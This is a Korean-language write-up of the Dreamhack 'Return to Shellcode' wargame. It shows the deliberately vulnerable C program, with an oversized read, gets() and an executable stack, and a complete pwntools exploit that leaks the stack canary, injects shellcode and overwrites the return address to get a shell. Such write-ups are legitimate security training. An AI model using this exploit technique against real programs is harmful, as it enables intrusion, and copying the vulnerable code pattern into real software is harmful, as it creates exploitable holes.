# [Dreamhack] Return to Shellcode 풀이

---

# C 코드

```c
// Name: r2s.c
// Compile: gcc -o r2s r2s.c -zexecstack

#include <stdio.h>
#include <unistd.h>

void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}

int main() {
  char buf[0x50];

  init();

  printf("Address of the buf: %p\n", buf);
  printf("Distance between buf and $rbp: %ld\n",
         (char*)__builtin_frame_address(0) - buf);

  printf("[1] Leak the canary\n");
  printf("Input: ");
  fflush(stdout);

  read(0, buf, 0x100);
  printf("Your input is '%s'\n", buf);

  puts("[2] Overwrite the return address");
  printf("Input: ");
  fflush(stdout);
  gets(buf);

  return 0;
}
```

파일을 실행하면 buf의 주소랑 buf와rbp의 오프셋을 알려준다. 이 정보를 토대로 첫번째 입력때 카나리를 leak하고, 두번째 입력때 쉘코드 삽입후 ret주소를 buf의 주소로 덮어주면 쉘을 딸 수 있을꺼같다.

---

# 파일 분석

우리가 디버깅을 하면서 알아내야 하는 정보를 정리해보자

- 없는거같다

이번 문제는 디버깅으로 알아내야하는 건 없고 전부 익스플로잇코드를 짜면서 해결 할 수 있는 문제다.

---

# Exploit

```python
from pwn import *

p = process("./r2s")
context.arch = "amd64"

p.recvuntil(b"buf: ")
buf_addr = p.recv(14) #buf주소 받기
p.recvuntil(b'$rbp: ')
buf2rbp_offset = p.recv(2) #buf랑 rbp 오프셋 받기
buf2canary = int(buf2rbp_offset) - 8 #buf랑 canary 오프셋 구하기

#----------Canary_leak----------
print("[+] Buf <-> Canary =", buf2canary)
canary_pay = b'A' * (buf2canary+1) #카나리 null바이트 1만큼 더해서 입력
p.sendafter(b"Input:", canary_pay)
p.recvuntil(canary_pay) #입력한 페이로드 걸러주기
canary = u64(b"\x00"+p.recvn(7)) #카나리 값 입력받기
print("[+] Canary =", hex(canary))

#----------Exploit----------
payload = asm(shellcraft.sh()) #쉘코드 입력
payload += b'A' * (buf2canary - len(payload)) #쉘코드 길이 빼고 카나리 전까지 더미데이터 입력
payload += p64(canary) #카나리 입력
payload += b'A' * 8  #sfp 입력
payload += p64(int(buf_addr,16)) #buf 주소 입력

p.sendlineafter(b': ', payload)
p.interactive()
```

이렇게 익스 코드를 짜주었다. 설명은 전부 주석으로 달아놓았다.

![Untitled](/4%EC%A3%BC%EC%B0%A8/IMG/r2s.png)

쉘이 잘 따진다.